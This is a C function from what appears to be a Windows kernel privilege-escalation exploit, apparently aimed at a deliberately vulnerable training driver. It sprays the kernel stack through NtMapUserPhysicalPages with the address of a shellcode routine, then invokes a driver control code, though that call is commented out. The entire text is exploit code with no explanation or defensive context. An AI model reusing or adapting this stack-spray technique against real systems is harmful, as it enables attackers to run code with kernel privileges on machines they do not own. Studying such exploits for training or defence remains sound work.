
VOID Trigger_shellcode()
{
	DWORD bReturn = 0;
	char buf[4] = {0};
	*(PDWORD32)(buf) = 0xBAD0B0B0 + 1;

	My_NtMapUserPhysicalPages NtMapUserPhysicalPages = (My_NtMapUserPhysicalPages)GetProcAddress(
		GetModuleHandle(L"ntdll"), 
		"NtMapUserPhysicalPages");

	if (NtMapUserPhysicalPages == NULL)
	{
		printf("[+]Failed to get MapUserPhysicalPages!!!\n");
		return;
	}

	PDWORD StackSpray = (PDWORD)malloc(1024 * 4);
	memset(StackSpray, 0x41, 1024 * 4);

	printf("[+]Spray address is 0x%p\n", StackSpray);

	for (int i = 0; i < 1024; i++)
	{
		*(PDWORD)(StackSpray + i) = (DWORD)& ShellCode;
		//*(PDWORD)(StackSpray + i) = (DWORD)0x41414141;
	}
	printf("[+]ShellCode address is 0x%p\n", ShellCode);
	NtMapUserPhysicalPages(NULL, 1024, StackSpray);

	//DeviceIoControl(hDevice, 0x22202f, buf, 4, NULL, 0, &bReturn, NULL);
}